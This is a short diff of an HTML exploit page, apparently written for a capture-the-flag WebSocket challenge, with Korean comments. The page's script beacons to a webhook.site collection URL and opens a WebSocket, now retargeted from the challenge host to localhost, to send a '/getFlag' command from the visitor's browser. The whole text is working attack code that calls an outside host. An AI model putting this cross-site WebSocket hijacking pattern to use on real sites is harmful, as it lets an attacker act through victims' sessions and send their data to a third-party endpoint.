@@ -8,14 +8,14 @@
 <body>
 
   <script>
-    fetch("https://webhook.site/a80c813f-7fdc-4a90-bad0-00ee94384cfd?_____INIT=1")
 
     /* ---------- 0. 스크립트 실행 확인 ---------- */
     fetch('https://webhook.site/a80c813f-7fdc-4a90-bad0-00ee94384cfd?status=loaded')
       .catch(() => { });
 
     /* ---------- 1. WebSocket 열고 /getFlag 전송 ---------- */
-    const ws = new WebSocket('wss://wembsoncket.chal.cyberjousting.com/');
+    // const ws = new WebSocket('wss://wembsoncket.chal.cyberjousting.com/');
+    const ws = new WebSocket('ws://localhost:5003/');
 
     ws.addEventListener('open', () => {
       ws.send(JSON.stringify({ message: '/getFlag' }));
